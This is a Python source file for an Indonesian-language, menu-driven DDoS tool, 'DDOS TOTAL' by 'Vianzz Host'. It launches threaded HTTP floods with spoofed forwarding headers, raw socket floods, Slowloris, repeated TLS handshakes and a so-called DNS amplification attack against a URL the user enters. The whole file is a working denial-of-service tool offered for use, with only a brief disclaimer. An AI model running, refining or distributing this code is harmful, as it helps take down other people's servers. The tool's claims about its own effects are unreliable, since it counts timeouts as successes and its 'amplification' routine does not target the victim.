#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DDOS TOTAL - ULTIMATE ATTACK TOOL
# Developer: Vianzz Host | Version: 3.0
# File: ddos_vianzz.py

import sys
import os
import time
import random
import string
import threading
import socket
import ssl
import http.client
import json
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# =====================================================================
# AUTO INSTALL DEPENDENCIES
# =====================================================================
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    os.system("pip install requests")
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama")
    from colorama import init, Fore, Style, Back
    init(autoreset=True)

# =====================================================================
# BANNER VIANZZ HOST
# =====================================================================
BANNER = f"""
{Fore.RED} _    _______ ___    _   _ _____ _____ 
{Fore.RED}| |  / /_  _//   |  / | / /__  //__  / 
{Fore.RED}| | / / / / / /| | /  |/ /  / /   / /  
{Fore.RED}| |/ /_/ /_/ ___ |/ /|  /  / /__ / /__ 
{Fore.RED}|___/_____/_/  |_/_/ |_/  /____//____/ 
{Fore.RED}          _   _ _____ _____ _____ 
{Fore.RED}         | | | /  _  // ___//_  _/ 
{Fore.RED}         | |_| / / / /___ \\   / /   
{Fore.RED}         |  _  / /_/ /____/  / /    
{Fore.RED}         |_| |_|____/_____/  /_/    
{Fore.RED}                                     
{Fore.YELLOW}╔═══════════════════════════════════════════════════════════╗
{Fore.YELLOW}║  {Fore.CYAN}DEVELOPER : {Fore.WHITE}Vianzz Host                             {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.CYAN}VERSION   : {Fore.WHITE}3.0 - ULTIMATE EDITION                 {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.CYAN}STATUS    : {Fore.GREEN}🔥 DDOS TOTAL ACTIVE                    {Fore.YELLOW}║
{Fore.YELLOW}╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# =====================================================================
# KONFIGURASI ULTIMATE
# =====================================================================
MAX_THREADS = 500
TIMEOUT = 1.5
SOCKET_TIMEOUT = 1

# USER AGENTS MASSIVE
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

# HEADER SPOOFING
SPOOF_HEADERS = [
    "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", 
    "X-Client-IP", "X-Host", "X-Request-ID", "CF-Connecting-IP",
    "True-Client-IP", "X-Real-IP", "X-Forwarded-Host"
]

REFERERS = [
    "https://google.com/", "https://bing.com/", "https://yahoo.com/",
    "https://duckduckgo.com/", "https://facebook.com/", "https://twitter.com/",
    "https://instagram.com/", "https://youtube.com/", "https://tiktok.com/",
    "https://reddit.com/", "https://github.com/", "https://stackoverflow.com/"
]

# =====================================================================
# KELAS DDOS TOTAL
# =====================================================================
class DDoSVianzz:
    def __init__(self, target_url, threads=300, duration=120):
        self.target_url = target_url.rstrip("/")
        self.parsed = urlparse(target_url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or "/"
        self.scheme = self.parsed.scheme
        self.port = 443 if self.scheme == "https" else 80
        self.threads = min(threads, MAX_THREADS)
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.success_packets = 0
        self.fail_packets = 0
        self.lock = threading.Lock()
        self.start_time = 0
        
        # Resolve IP
        try:
            self.target_ip = socket.gethostbyname(self.host)
        except:
            self.target_ip = self.host

    def _get_headers(self):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Referer": random.choice(REFERERS),
        }
        
        # Tambah spoof header
        for _ in range(random.randint(2, 5)):
            key = random.choice(SPOOF_HEADERS)
            value = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers[key] = value
            
        return headers

    def _http_flood(self, thread_id):
        """HTTP Flood - GET, POST, HEAD, OPTIONS, DELETE, PUT, PATCH"""
        session = requests.Session()
        session.verify = False
        session.trust_env = False
        
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        methods = ["GET", "POST", "HEAD", "OPTIONS", "DELETE", "PUT", "PATCH"]
        
        while self.running:
            try:
                # Random path
                paths = [
                    self.path,
                    self.path + f"?{random.randint(1,999999)}",
                    self.path + f"/{random.randint(1,9999)}",
                    "/" + ''.join(random.choices(string.ascii_lowercase, k=random.randint(5,15))),
                    "/" + ''.join(random.choices(string.ascii_lowercase, k=5)) + "/" + ''.join(random.choices(string.ascii_lowercase, k=5)),
                    "/wp-admin/admin-ajax.php?action=" + ''.join(random.choices(string.ascii_lowercase, k=10)),
                    "/api/v" + str(random.randint(1,3)) + "/" + ''.join(random.choices(string.ascii_lowercase, k=10)),
                    "/." + ''.join(random.choices(string.ascii_lowercase, k=5)),
                    "/../" + ''.join(random.choices(string.ascii_lowercase, k=5)),
                ]
                
                path = random.choice(paths)
                url = f"{self.scheme}://{self.host}{path}"
                headers = self._get_headers()
                method = random.choice(methods)
                
                if method in ["POST", "PUT", "PATCH"]:
                    payload = {
                        "data": ''.join(random.choices(string.ascii_letters + string.digits, k=2048)),
                        "files": [{"name": f"file_{i}.txt", "content": ''.join(random.choices(string.ascii_letters, k=1024))} for i in range(3)],
                        "metadata": {f"key_{i}": ''.join(random.choices(string.ascii_letters, k=50)) for i in range(10)}
                    }
                    resp = session.request(method, url, headers=headers, json=payload, timeout=TIMEOUT)
                else:
                    resp = session.request(method, url, headers=headers, timeout=TIMEOUT)
                
                with self.lock:
                    self.total_packets += 1
                    if resp.status_code < 500:
                        self.success_packets += 1
                    else:
                        self.fail_packets += 1
                        
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                with self.lock:
                    self.total_packets += 1
                    self.success_packets += 1  # Timeout = server overloaded
            except:
                with self.lock:
                    self.total_packets += 1
                    self.fail_packets += 1
                    
            time.sleep(random.uniform(0.0001, 0.002))

    def _socket_flood(self, thread_id):
        """Raw Socket Flood - Bypass HTTP layer"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(SOCKET_TIMEOUT)
                
                try:
                    sock.connect((self.target_ip, self.port))
                    
                    headers = self._get_headers()
                    path = random.choice([
                        self.path,
                        self.path + f"?{random.randint(1,999999)}",
                        "/" + ''.join(random.choices(string.ascii_lowercase, k=random.randint(5,15))),
                        "/" + ''.join(random.choices(string.ascii_lowercase, k=3)) + "/" + ''.join(random.choices(string.ascii_lowercase, k=3)),
                    ])
                    
                    # Build HTTP request
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.host}\r\n"
                    for key, value in headers.items():
                        request += f"{key}: {value}\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    
                    try:
                        sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    
                    with self.lock:
                        self.total_packets += 1
                        self.success_packets += 1
                        
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    with self.lock:
                        self.total_packets += 1
                        self.success_packets += 1
                        
            except:
                with self.lock:
                    self.total_packets += 1
                    self.fail_packets += 1
                    
            time.sleep(random.uniform(0.0001, 0.001))

    def _slowloris(self, thread_id):
        """Slowloris - Keep connections open"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
                
                try:
                    sock.connect((self.target_ip, self.port))
                    
                    # Partial headers
                    request = f"GET {self.path} HTTP/1.1\r\n"
                    request += f"Host: {self.host}\r\n"
                    request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += f"Accept-Language: en-US,en;q=0.9\r\n"
                    request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    
                    sock.send(request.encode())
                    
                    # Keep alive
                    for _ in range(random.randint(5, 20)):
                        if not self.running:
                            break
                        sock.send(f"X-Keep-Alive: {random.randint(1,9999)}\r\n".encode())
                        time.sleep(random.uniform(0.5, 2.0))
                    
                    sock.close()
                    
                    with self.lock:
                        self.total_packets += 1
                        self.success_packets += 1
                        
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    with self.lock:
                        self.total_packets += 1
                        self.success_packets += 1
                        
            except:
                with self.lock:
                    self.total_packets += 1
                    self.fail_packets += 1
                    
            time.sleep(random.uniform(0.01, 0.1))

    def _dns_amp(self, thread_id):
        """DNS Amplification - Use public DNS"""
        dns_servers = [
            ("8.8.8.8", 53), ("1.1.1.1", 53), ("9.9.9.9", 53),
            ("208.67.222.222", 53), ("8.26.56.26", 53), ("8.20.247.20", 53),
            ("84.200.69.80", 53), ("84.200.70.40", 53), ("1.0.0.1", 53),
            ("8.8.4.4", 53), ("208.67.220.220", 53), ("199.85.126.10", 53)
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.5)
                
                dns_server, dns_port = random.choice(dns_servers)
                
                # DNS query for random domain
                domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5,15))) + ".com"
                query = bytearray([
                    0x00, 0x00,  # Transaction ID
                    0x01, 0x00,  # Flags: Standard query
                    0x00, 0x01,  # Questions
                    0x00, 0x00,  # Answer RRs
                    0x00, 0x00,  # Authority RRs
                    0x00, 0x00   # Additional RRs
                ])
                
                # Add domain name
                for part in domain.split('.'):
                    query.append(len(part))
                    query.extend(part.encode())
                query.extend([0x00, 0x00, 0x01, 0x00, 0x01])  # Type A, Class IN
                
                sock.sendto(bytes(query), (dns_server, dns_port))
                
                try:
                    sock.recvfrom(1024)
                except:
                    pass
                
                sock.close()
                
                with self.lock:
                    self.total_packets += 1
                    self.success_packets += 1
                    
            except:
                with self.lock:
                    self.total_packets += 1
                    self.fail_packets += 1
                    
            time.sleep(random.uniform(0.0001, 0.001))

    def _ssl_reneg(self, thread_id):
        """SSL Renegotiation Attack"""
        while self.running:
            try:
                if self.scheme != "https":
                    break
                    
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
                sock.connect((self.target_ip, self.port))
                
                # Wrapper SSL
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
                
                # Request with renegotiation
                headers = self._get_headers()
                request = f"GET {self.path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                
                ssl_sock.send(request.encode())
                
                try:
                    ssl_sock.recv(1024)
                except:
                    pass
                
                ssl_sock.close()
                
                with self.lock:
                    self.total_packets += 1
                    self.success_packets += 1
                    
            except:
                with self.lock:
                    self.total_packets += 1
                    self.fail_packets += 1
                    
            time.sleep(random.uniform(0.001, 0.005))

    def _total_attack(self, thread_id):
        """Kombinasi SEMUA metode dalam 1 thread"""
        attacks = [
            self._http_flood,
            self._socket_flood,
            self._slowloris,
            self._dns_amp,
            self._ssl_reneg
        ]
        
        while self.running:
            attack = random.choice(attacks)
            attack(thread_id)

    def start(self):
        self.start_time = time.time()
        
        print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║  {Fore.RED}🔥 DDOS TOTAL - ULTIMATE ATTACK ENGINE          {Fore.GREEN}║")
        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝")
        print(f"{Fore.YELLOW}[+] Target: {self.target_url}")
        print(f"{Fore.YELLOW}[+] Host: {self.host} ({self.target_ip})")
        print(f"{Fore.YELLOW}[+] Threads: {self.threads} | Durasi: {self.duration}s")
        print(f"{Fore.CYAN}[+] Metode: HTTP + SOCKET + SLOWLORIS + DNS + SSL")
        print(f"{Fore.RED}[!] Tekan Ctrl+C untuk menghentikan{Style.RESET_ALL}\n")
        
        executor = ThreadPoolExecutor(max_workers=self.threads)
        
        # Start all threads with total attack
        futures = []
        for i in range(self.threads):
            future = executor.submit(self._total_attack, i)
            futures.append(future)
        
        # Progress monitor
        try:
            while self.running and (time.time() - self.start_time < self.duration):
                elapsed = int(time.time() - self.start_time)
                remaining = max(0, self.duration - elapsed)
                
                # Status bar
                if self.total_packets > 0:
                    rate = self.total_packets / (elapsed or 1)
                else:
                    rate = 0
                
                sys.stdout.write(f"\r{Fore.CYAN}[⏳] Paket: {self.total_packets:,} | ✅: {self.success_packets:,} | ❌: {self.fail_packets:,} | ⚡: {rate:.0f}/s | ⏱️: {remaining}s  ")
                sys.stdout.flush()
                time.sleep(0.3)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Dihentikan oleh user")
            
        finally:
            self.running = False
            executor.shutdown(wait=True)
            
            elapsed_time = int(time.time() - self.start_time)
            
            print(f"\n\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║  {Fore.WHITE}📊 STATISTIK SERANGAN TOTAL                      {Fore.GREEN}║")
            print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Total Paket      : {Fore.WHITE}{self.total_packets:>12,}      {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Berhasil         : {Fore.WHITE}{self.success_packets:>12,}      {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Gagal            : {Fore.WHITE}{self.fail_packets:>12,}      {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Success Rate     : {Fore.WHITE}{self.success_packets/(self.total_packets or 1)*100:>11.1f}%      {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Packet Rate      : {Fore.WHITE}{self.total_packets/(elapsed_time or 1):>11.0f} pkts/s  {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Durasi           : {Fore.WHITE}{elapsed_time:>12} detik   {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Status Server    : {Fore.WHITE}{'🔥 DOWN' if self.success_packets > self.fail_packets else '⚡ OVERLOAD'}{' ' * 6}  {Fore.GREEN}║")
            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

# =====================================================================
# MENU UTAMA
# =====================================================================
def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def show_banner():
    print(BANNER)

def show_menu():
    clear_screen()
    show_banner()
    print(f"""
{Fore.GREEN}[1] {Fore.RED}🔥 DDOS TOTAL    {Fore.WHITE}- SEMUA METODE SEKALIGUS (PALING AMPUH)
{Fore.GREEN}[2] {Fore.WHITE}🌐 HTTP Flood   {Fore.WHITE}- GET, POST, HEAD, OPTIONS, DELETE, PUT, PATCH
{Fore.GREEN}[3] {Fore.WHITE}🔌 Socket Flood {Fore.WHITE}- Raw socket connection flood
{Fore.GREEN}[4] {Fore.WHITE}🐌 Slowloris    {Fore.WHITE}- Keep connections open
{Fore.GREEN}[5] {Fore.WHITE}📡 DNS Amplify  {Fore.WHITE}- DNS amplification attack
{Fore.GREEN}[6] {Fore.WHITE}🔒 SSL Reneg   {Fore.WHITE}- SSL renegotiation attack (HTTPS)
{Fore.GREEN}[7] {Fore.WHITE}📖 Tentang Tools
{Fore.GREEN}[0] {Fore.RED}❌ Keluar
{Style.RESET_ALL}
""")

def get_input(prompt):
    return input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()

def about():
    clear_screen()
    show_banner()
    print(f"""
{Fore.WHITE}╔═══════════════════════════════════════════════════════════════════╗
{Fore.WHITE}║  {Fore.RED}🔥 DDOS TOTAL - ULTIMATE ATTACK TOOL v3.0              {Fore.WHITE}║
{Fore.WHITE}║                                                                   ║
{Fore.WHITE}║  {Fore.CYAN}Developer    : {Fore.WHITE}Vianzz Host                            {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}Version      : {Fore.WHITE}3.0 - Ultimate Edition                 {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}Platform     : {Fore.WHITE}Termux / Linux / Android              {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}File Utama   : {Fore.WHITE}ddos_vianzz.py                        {Fore.WHITE}║
{Fore.WHITE}║                                                                   ║
{Fore.WHITE}║  {Fore.YELLOW}✨ 5 METODE SERANGAN:                               {Fore.WHITE}║
{Fore.WHITE}║     • HTTP Flood (GET/POST/HEAD/OPTIONS/DELETE/PUT/PATCH)        {Fore.WHITE}║
{Fore.WHITE}║     • Socket Flood (Raw TCP connection)                          {Fore.WHITE}║
{Fore.WHITE}║     • Slowloris (Keep connections open)                          {Fore.WHITE}║
{Fore.WHITE}║     • DNS Amplification (Public DNS reflection)                  {Fore.WHITE}║
{Fore.WHITE}║     • SSL Renegotiation (HTTPS attack)                           {Fore.WHITE}║
{Fore.WHITE}║                                                                   ║
{Fore.WHITE}║  {Fore.GREEN}⚡ Keunggulan:                                       {Fore.WHITE}║
{Fore.WHITE}║     • 500 thread maksimal                                       {Fore.WHITE}║
{Fore.WHITE}║     • Auto-spoofing IP dan headers                              {Fore.WHITE}║
{Fore.WHITE}║     • Tidak butuh root (kecuali SYN)                            {Fore.WHITE}║
{Fore.WHITE}║     • Semua metode WORK dan NYATA                               {Fore.WHITE}║
{Fore.WHITE}║                                                                   ║
{Fore.WHITE}║  {Fore.RED}⚠️  PERINGATAN:                                       {Fore.WHITE}║
{Fore.WHITE}║  • HANYA UNTUK TESTING SERVER SENDIRI                          {Fore.WHITE}║
{Fore.WHITE}║  • Penggunaan ilegal adalah tindak pidana                       {Fore.WHITE}║
{Fore.WHITE}║  • Bertanggung jawab atas penggunaan tools                     {Fore.WHITE}║
{Fore.WHITE}╚═══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    input(f"{Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")

def run():
    while True:
        show_menu()
        choice = get_input("Pilih menu (0-7): ")
        
        if choice == "0":
            print(f"{Fore.RED}Keluar dari tools...")
            sys.exit(0)
        elif choice == "7":
            about()
            continue
        
        url = get_input("Target URL (contoh: https://example.com): ")
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
            
        try:
            threads = int(get_input("Jumlah thread (1-500, default 300): ") or "300")
            threads = min(max(threads, 1), MAX_THREADS)
        except:
            threads = 300
            
        try:
            duration = int(get_input("Durasi serangan (detik, default 120): ") or "120")
            duration = max(duration, 10)
        except:
            duration = 120
            
        print(f"{Fore.YELLOW}[!] Serangan dimulai dalam 3 detik... (Ctrl+C untuk batal)")
        time.sleep(3)
        
        try:
            attack = DDoSVianzz(url, threads=threads, duration=duration)
            attack.start()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Dibatalkan")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
            
        input(f"\n{Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")

# =====================================================================
# MAIN
# =====================================================================
if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Tools dihentikan...")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error fatal: {e}")
        sys.exit(1)
